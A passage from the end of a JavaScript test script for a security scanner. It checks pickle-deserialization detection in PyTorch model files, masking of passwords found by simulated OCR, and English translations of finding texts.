    check('modell: ZIP-basiertes .pt beim Einlesen geprüft (data.pkl)', mf.length === 1 && /model\.pt!\/archive\/data\.pkl/.test(mf[0].location) && classify(mf[0]).cwe === 'CWE-502');
    fs.rmSync(tmpM, { recursive: true, force: true });

    // OCR (tesseract nur simuliert)
    const { scanImages } = require('../src/core/ocr');
    const tmpI = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-ocr-'));
    fs.writeFileSync(path.join(tmpI, 'login.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    const o1 = await scanImages([tmpI], { run: async () => ({ ok: true, text: 'Server: db01\nPasswort: Sommer2026!\n' }) });
    const o2 = await scanImages([tmpI], { run: async () => ({ ok: true, text: 'Passwort: ********\nWillkommen' }) });
    const o3 = await scanImages([tmpI], { run: async () => ({ ok: false, missing: true, text: '' }) });
    check('ocr: sichtbares Passwort erkannt und maskiert', o1.findings.length === 1 && o1.findings[0].ruleId === 'ocr-visible-password' && !/Sommer2026/.test(o1.findings[0].evidence));
    check('ocr: Sternchen ruhig, fehlendes tesseract still übersprungen', !o2.findings.length && !o3.findings.length && !o3.notes.length && !o3.ran);
    fs.rmSync(tmpI, { recursive: true, force: true });
    collected.push(...o1.findings, ...mf);

    // Alle neuen Texte haben eine englische Fassung
    const GER2 = /[äöüß]|\b(der|die|das|und|nicht|ist|mit|für|oder|wird|werden|auf|eine?|zu|von|bei|nach|aus|sich|Datei|ohne)\b/;
    const leftEn = collected.map(i18n.localizeFinding).flatMap((f) => [f.title, f.description, f.impact, f.remediation]).filter((t) => t && GER2.test(t));
    check('code-regeln: alle neuen Befundtexte haben eine englische Fassung', leftEn.length === 0, [...new Set(leftEn)].slice(0, 3).join(' | '));
    if (leftEn.length) console.log([...new Set(leftEn)].slice(0, 40).join('\n'));
  }

  console.log(`\n${pass} ok, ${fail} fehlgeschlagen`);
  process.exit(fail ? 1 : 0);
})();
